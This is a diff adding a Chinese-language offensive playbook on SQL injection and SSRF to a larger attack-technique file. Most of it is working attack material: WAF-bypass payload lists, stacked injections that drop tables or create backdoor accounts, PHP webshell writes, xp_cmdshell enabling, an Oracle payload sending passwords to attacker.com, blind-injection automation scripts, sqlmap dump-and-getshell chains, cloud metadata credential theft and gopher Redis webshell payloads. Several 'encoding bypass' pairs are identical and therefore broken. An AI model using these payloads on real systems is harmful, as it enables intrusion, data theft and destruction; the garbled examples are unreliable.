@@ -2372,6 +2372,625 @@ Clear-EventLog -LogName Application,Security,System
 - JWT攻击：None算法、密钥混淆、KID注入
 
 
+
+**SQL注入攻防实战（深度经验）：**
+
+### SQL注入快速发现（1分钟）
+
+```bash
+#!/bin/bash
+# SQL注入快速检测
+
+URL="$1"
+
+# 1. 基础测试（10秒）
+echo "[+] 测试1: 单引号报错"
+curl -s "$URL?id=1'" | grep -iE "sql|mysql|error|syntax|warning" && echo "[+] 可能存在SQL注入"
+
+echo "[+] 测试2: 布尔逻辑"
+curl -s "$URL?id=1 AND 1=1" > true.txt
+curl -s "$URL?id=1 AND 1=2" > false.txt
+diff true.txt false.txt && echo "[+] 布尔逻辑有差异，可能存在注入"
+
+echo "[+] 测试3: 时间延迟"
+time curl -s "$URL?id=1 AND SLEEP(5)" | wc -l
+# 如果耗时>5秒，可能存在时间盲注
+
+# 2. 自动化测试（50秒）
+sqlmap -u "$URL?id=1" --batch --level=3 --risk=2 --threads=10 --tamper=space2comment
+```
+
+### SQL注入绕过WAF（完整payload库）
+
+**Cloudflare WAF绕过：**
+```sql
+-- 1. 注释混淆
+1'/**/OR/**/1=1--
+1'/*!50000OR*//*!50000*//*!500001=1*/--
+1'/*!50000UNION*//*!50000SELECT*/1,2,3--
+
+-- 2. 大小写混淆
+1' UnIoN SeLeCt 1,2,3--
+1' Or 1=1--
+
+-- 3. 内联注释
+1'/*!50000UNION*/SELECT/*!50000*/1,2,3--
+1'/*!50000OR*/1=1--
+
+-- 4. 空白符替换
+1'%09OR%091=1--
+1'%0AOR%0A1=1--
+1'%0DOR%0D1=1--
+1'%20OR%201=1--
+```
+
+**AWS WAF绕过：**
+```sql
+-- 1. Unicode编码
+1' OR 1=1--
+1' OR 1=1--
+1' OR 1=1--
+
+-- 2. 十六进制编码
+1' OR 0x31=0x31--
+1' UNION SELECT 0x31,0x32,0x33--
+
+-- 3. 双编码
+1'%2527 OR 1=1--
+1'%2527 UNION SELECT 1,2,3--
+```
+
+**Imperva WAF绕过：**
+```sql
+-- 1. 空字节
+1'%00OR%001=1--
+1'%00UNION%00SELECT%001,2,3--
+
+-- 2. 字符替代
+1' OR 1=1--
+1' OR 1=1--
+1' OR 1=1--
+
+-- 3. 函数替代
+1' OR CHAR(49)=CHAR(49)--
+1' OR ASCII('1')=ASCII('1')--
+```
+
+**通用WAF绕过技巧：**
+```sql
+-- 1. 数学运算替代
+1' OR 2-1=1--
+1' OR 1+0=1--
+1' OR 1*1=1--
+1' OR 1/1=1--
+
+-- 2. 括号混淆
+1' OR(1)=(1)--
+1' OR((1))=(1)--
+1' OR((((1))))=(((1)))--
+
+-- 3. 时间函数替代
+1' OR SLEEP(5)--
+1' OR BENCHMARK(5000000,MD5(1))--
+1' OR WAITFOR DELAY '00:00:05'--
+
+-- 4. 字符串拼接
+1' OR '1'='1'--
+1' OR CONCAT('1','=1')--
+1' OR CHAR(49)=CHAR(49)--
+```
+
+### 不同数据库SQL注入特性
+
+**MySQL注入：**
+```sql
+-- 1. 版本信息
+1' UNION SELECT VERSION(),DATABASE(),USER()--
+
+-- 2. 文件读取
+1' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+-- 3. 文件写入（需要写权限）
+1' UNION SELECT '<?php eval($_POST[x]);?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+-- 4. 信息收集
+1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
+1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+
+-- 5. 堆叠注入
+1'; DROP TABLE users;--
+1'; CREATE TABLE test(id INT);--
+1'; INSERT INTO test VALUES(1);--
+```
+
+**PostgreSQL注入：**
+```sql
+-- 1. 版本信息
+1' UNION SELECT version(),current_database(),current_user--
+
+-- 2. 文件读取
+1' UNION SELECT pg_read_file('/etc/passwd')--
+
+-- 3. 文件写入
+1'; COPY (SELECT '<?php eval($_POST[x]);?>') TO '/var/www/html/shell.php';--
+
+-- 4. 命令执行（需要超级用户）
+1'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;--
+1'; SELECT system('id');--
+
+-- 5. 信息收集
+1' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--
+1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+```
+
+**MSSQL注入：**
+```sql
+-- 1. 版本信息
+1' UNION SELECT @@VERSION,DB_NAME(),USER_NAME()--
+
+-- 2. 命令执行（需要xp_cmdshell）
+1'; EXEC xp_cmdshell 'whoami';--
+1'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
+1'; EXEC xp_cmdshell 'powershell -e <base64>';--
+
+-- 3. 文件读取
+1' UNION SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
+
+-- 4. 信息收集
+1' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+1' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--
+```
+
+**Oracle注入：**
+```sql
+-- 1. 版本信息
+1' UNION SELECT banner FROM v$version WHERE rownum=1--
+
+-- 2. 信息收集
+1' UNION SELECT table_name FROM all_tables WHERE rownum<=10--
+1' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+-- 3. 时间延迟
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(32),5)--
+
+-- 4. 命令执行（需要DBA权限）
+1'; SELECT UTL_INADDR.get_host_name('127.0.0.1'||(SELECT utl_http.request('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual)) FROM dual;--
+```
+
+### 盲注技巧（时间盲注/布尔盲注）
+
+**时间盲注自动化：**
+```python
+#!/usr/bin/env python3
+# 时间盲注自动化脚本
+
+import requests
+import time
+
+url = "http://target.com/page?id=1"
+payload_template = "1' AND (SELECT SUBSTRING(@@VERSION,{},1))='{}' AND SLEEP(5)--"
+
+def time_blind_injection(query_func):
+    result = ""
+    for pos in range(1, 100):
+        found = False
+        for char in "abcdefghijklmnopqrstuvwxyz0123456789._-":
+            payload = query_func(pos, char)
+            start = time.time()
+            requests.get(url, params={"id": payload}, timeout=10)
+            elapsed = time.time() - start
+            
+            if elapsed > 4:
+                result += char
+                found = True
+                print(f"[+] Position {pos}: {char} (Total: {result})")
+                break
+        
+        if not found:
+            break
+    
+    return result
+
+# 使用示例
+version = time_blind_injection(lambda p, c: f"1' AND (SELECT SUBSTRING(@@VERSION,{p},1))='{c}' AND SLEEP(5)--")
+print(f"[+] MySQL Version: {version}")
+```
+
+**布尔盲注自动化：**
+```python
+#!/usr/bin/env python3
+# 布尔盲注自动化脚本
+
+import requests
+
+url = "http://target.com/page?id=1"
+
+def get_true_response():
+    r = requests.get(url, params={"id": "1 AND 1=1"})
+    return r.text
+
+def get_false_response():
+    r = requests.get(url, params={"id": "1 AND 1=2"})
+    return r.text
+
+true_resp = get_true_response()
+false_resp = get_false_response()
+
+def boolean_blind_injection(query_func):
+    result = ""
+    for pos in range(1, 100):
+        for char in "abcdefghijklmnopqrstuvwxyz0123456789._-":
+            payload = query_func(pos, char)
+            r = requests.get(url, params={"id": payload})
+            
+            if r.text == true_resp:
+                result += char
+                print(f"[+] Position {pos}: {char} (Total: {result})")
+                break
+    
+    return result
+
+# 使用示例
+database = boolean_blind_injection(lambda p, c: f"1' AND SUBSTRING(DATABASE(),{p},1)='{c}'--")
+print(f"[+] Database: {database}")
+```
+
+### 堆叠注入实战
+
+**堆叠注入利用场景：**
+```sql
+-- 1. 修改数据
+1'; UPDATE users SET password='hacked' WHERE id=1;--
+1'; DELETE FROM logs WHERE id>0;--
+
+-- 2. 创建后门
+1'; INSERT INTO users(username,password) VALUES('backdoor','pass123');--
+1'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass123'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';--
+
+-- 3. 权限提升
+1'; GRANT FILE ON *.* TO 'user'@'localhost';--
+1'; GRANT EXECUTE ON xp_cmdshell TO 'user';--
+
+-- 4. 数据导出
+1'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt';--
+1'; COPY (SELECT * FROM users) TO '/tmp/users.txt';--
+```
+
+### 二次注入实战
+
+**二次注入利用流程：**
+```sql
+-- 步骤1: 注册时注入（被转义）
+用户名: admin'--
+密码: pass123
+
+-- 步骤2: 数据库存储（转义被去除）
+INSERT INTO users(username, password) VALUES('admin\'--', 'pass123')
+-- 实际存储: admin'--
+
+-- 步骤3: 修改密码时触发
+UPDATE users SET password='newpass' WHERE username='admin'--'
+-- 实际执行: UPDATE users SET password='newpass' WHERE username='admin'--''
+-- 所有用户密码被修改为'newpass'
+```
+
+### SQL注入快速利用链
+
+**完整利用流程（10分钟）：**
+```bash
+#!/bin/bash
+# SQL注入快速利用
+
+URL="$1"
+
+echo "[+] 阶段1: 确认注入点（1分钟）"
+sqlmap -u "$URL?id=1" --batch --dbs --threads=10
+
+echo "[+] 阶段2: 获取数据库（1分钟）"
+sqlmap -u "$URL?id=1" -D target_db --tables --threads=10
+
+echo "[+] 阶段3: 获取表结构（1分钟）"
+sqlmap -u "$URL?id=1" -D target_db -T users --columns --threads=10
+
+echo "[+] 阶段4: 导出数据（2分钟）"
+sqlmap -u "$URL?id=1" -D target_db -T users -C username,password,email --dump --threads=10
+
+echo "[+] 阶段5: 文件写入Getshell（5分钟）"
+sqlmap -u "$URL?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
+```
+
+---
+
+**SSRF攻防实战（深度经验）：**
+
+### SSRF快速发现（2分钟）
+
+```bash
+#!/bin/bash
+# SSRF快速检测
+
+URL="$1"
+
+echo "[+] 测试1: 基础SSRF（localhost）"
+curl -s "$URL?url=http://127.0.0.1" | grep -iE "localhost|127.0.0.1|internal" && echo "[+] 可能存在SSRF"
+
+echo "[+] 测试2: 内网IP探测"
+curl -s "$URL?url=http://192.168.1.1" | grep -iE "192.168|10.0|172.16" && echo "[+] 可访问内网"
+
+echo "[+] 测试3: 端口扫描"
+for port in 22 3306 6379 27017; do
+    curl -s "$URL?url=http://127.0.0.1:$port" && echo "[+] Port $port 开放"
+done
+
+echo "[+] 测试4: 协议测试"
+curl -s "$URL?url=file:///etc/passwd" && echo "[+] file协议可用"
+curl -s "$URL?url=gopher://127.0.0.1:6379" && echo "[+] gopher协议可用"
+curl -s "$URL?url=dict://127.0.0.1:6379" && echo "[+] dict协议可用"
+```
+
+### SSRF绕过技巧
+
+**URL编码绕过：**
+```bash
+# 1. 单次编码
+http://127.0.0.1 → http://127.0.0.1
+http://127.0.0.1 → http://127.0.0.1
+
+# 2. 双次编码
+http://127.0.0.1 → http://127.0.0.1
+http://127.0.0.1 → http://127.0.0.1
+
+# 3. 十六进制编码
+http://127.0.0.1 → http://0x7f.0x00.0x00.0x01
+http://127.0.0.1 → http://0x7f000001
+
+# 4. 八进制编码
+http://127.0.0.1 → http://0177.0.0.1
+http://127.0.0.1 → http://017700000001
+```
+
+**域名绕过：**
+```bash
+# 1. 域名指向127.0.0.1
+http://127.0.0.1.xip.io
+http://127.0.0.1.nip.io
+http://localhost.127.0.0.1.nip.io
+
+# 2. 短域名
+http://127.1
+http://0.0.0.0
+
+# 3. 域名重定向
+# 在自己的域名设置A记录指向127.0.0.1
+http://attacker.com → 302重定向到 http://127.0.0.1
+
+# 4. DNS重绑定
+http://rbndr.us:80/bind/127.0.0.1
+http://127.0.0.1.127.0.0.1.nip.io
+```
+
+**协议绕过：**
+```bash
+# 1. 协议替换
+http://127.0.0.1 → http://127.0.0.1
+http://127.0.0.1 → http://127.0.0.1
+http://127.0.0.1 → http://127.0.0.1
+
+# 2. 协议混淆
+http://127.0.0.1:80@evil.com
+http://evil.com#@127.0.0.1
+http://evil.com?redirect=http://127.0.0.1
+
+# 3. IPv6
+http://[::1]
+http://[::1]:80
+http://[0000:0000:0000:0000:0000:0000:0000:0001]
+```
+
+**白名单绕过：**
+```bash
+# 1. 子域名绕过
+白名单: https://target.com
+绕过: https://target.com.attacker.com
+绕过: https://attacker.com/target.com
+
+# 2. 路径绕过
+白名单: https://target.com
+绕过: https://target.com@attacker.com
+绕过: https://target.com#attacker.com
+绕过: https://target.com/.attacker.com
+
+# 3. 参数污染
+白名单: https://target.com
+绕过: https://target.com?redirect=http://127.0.0.1
+绕过: https://target.com/api?url=http://127.0.0.1
+```
+
+### SSRF协议利用
+
+**HTTP/HTTPS协议：**
+```bash
+# 1. 内网端口扫描
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:6379
+http://127.0.0.1:27017
+
+# 2. 内网服务探测
+http://127.0.0.1:8080/admin
+http://127.0.0.1:8080/api
+http://192.168.1.100/phpmyadmin
+
+# 3. 云元数据服务
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+```
+
+**File协议：**
+```bash
+# 1. 文件读取
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///proc/version
+file://C:/Windows/System32/drivers/etc/hosts
+file://C:/Windows/win.ini
+
+# 2. 目录遍历
+file:///etc/
+file:///var/www/
+file:///home/
+```
+
+**Gopher协议：**
+```bash
+# 1. Redis未授权访问
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$24%0d%0a%0a%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%78%5d%29%3b%3f%3e%0a%0a%0d%0a
+
+# 2. FastCGI攻击
+gopher://127.0.0.1:9000/_[FastCGI Payload]
+
+# 3. Memcached攻击
+gopher://127.0.0.1:11211/_[Memcached Payload]
+
+# 4. MySQL攻击
+gopher://127.0.0.1:3306/_[MySQL Payload]
+```
+
+**Dict协议：**
+```bash
+# 1. Redis信息
+dict://127.0.0.1:6379/INFO
+dict://127.0.0.1:6379/CONFIG GET dir
+
+# 2. 端口扫描
+dict://127.0.0.1:22
+dict://127.0.0.1:3306
+dict://127.0.0.1:6379
+```
+
+### SSRF云元数据攻击
+
+**AWS IMDS攻击：**
+```bash
+# 1. IMDS v1（直接访问）
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+
+# 2. IMDS v2（需要Token）
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 3. SSRF利用
+# 在存在SSRF的URL中：
+http://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
+```
+
+**Azure IMDS攻击：**
+```bash
+# 1. 获取Token
+curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# 2. 获取Metadata
+curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# 3. SSRF利用
+http://target.com/api?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+```
+
+**GCP元数据攻击：**
+```bash
+# 1. 获取Token
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+
+# 2. 获取Metadata
+curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
+
+# 3. SSRF利用
+http://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+```
+
+### SSRF内网服务利用
+
+**Redis利用：**
+```bash
+# 1. 通过SSRF写入Webshell
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$24%0d%0a%0a%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%78%5d%29%3b%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
+
+# 2. 通过SSRF执行命令（需要Redis写权限）
+gopher://127.0.0.1:6379/_[Redis命令Payload]
+```
+
+**FastCGI利用：**
+```bash
+# 1. 通过SSRF攻击FastCGI
+gopher://127.0.0.1:9000/_[FastCGI Payload写入Webshell]
+
+# 2. 利用脚本
+python3 fcgi_exp.py http://target.com/api?url=gopher://127.0.0.1:9000/
+```
+
+**Memcached利用：**
+```bash
+# 1. 通过SSRF攻击Memcached
+gopher://127.0.0.1:11211/_[Memcached Payload]
+```
+
+### SSRF端口扫描自动化
+
+```python
+#!/usr/bin/env python3
+# SSRF端口扫描脚本
+
+import requests
+import threading
+
+def scan_port(ssrf_url, ip, port):
+    payload = f"http://{ip}:{port}"
+    try:
+        r = requests.get(ssrf_url, params={"url": payload}, timeout=3)
+        if r.status_code == 200 and len(r.content) > 0:
+            print(f"[+] {ip}:{port} - OPEN")
+            return True
+    except:
+        pass
+    return False
+
+# 使用示例
+ssrf_url = "http://target.com/api?url="
+target_ip = "127.0.0.1"
+
+common_ports = [22, 80, 443, 3306, 6379, 27017, 8080, 9000, 11211]
+
+for port in common_ports:
+    t = threading.Thread(target=scan_port, args=(ssrf_url, target_ip, port))
+    t.start()
+```
+
+### SSRF攻击优先级矩阵
+
+```
+高优先级 + 高成功率 = 立即攻击
+├─ SSRF + 云元数据服务 → 成功率90%+
+├─ SSRF + Redis未授权 → 成功率80%+
+├─ SSRF + FastCGI → 成功率70%+
+└─ SSRF + 内网管理后台 → 成功率60%+
+
+中优先级 + 中成功率 = 快速测试
+├─ SSRF + 内网Web服务 → 成功率40-60%
+├─ SSRF + 内网数据库 → 成功率30-50%
+└─ SSRF + 端口扫描 → 成功率50%+
+
+低优先级 + 低成功率 = 最后尝试
+└─ SSRF + 强过滤 → 成功率<30%
+```
+
+---
+
 **API接口攻防实战（深度经验）：**
 
 ### API接口发现（5分钟）
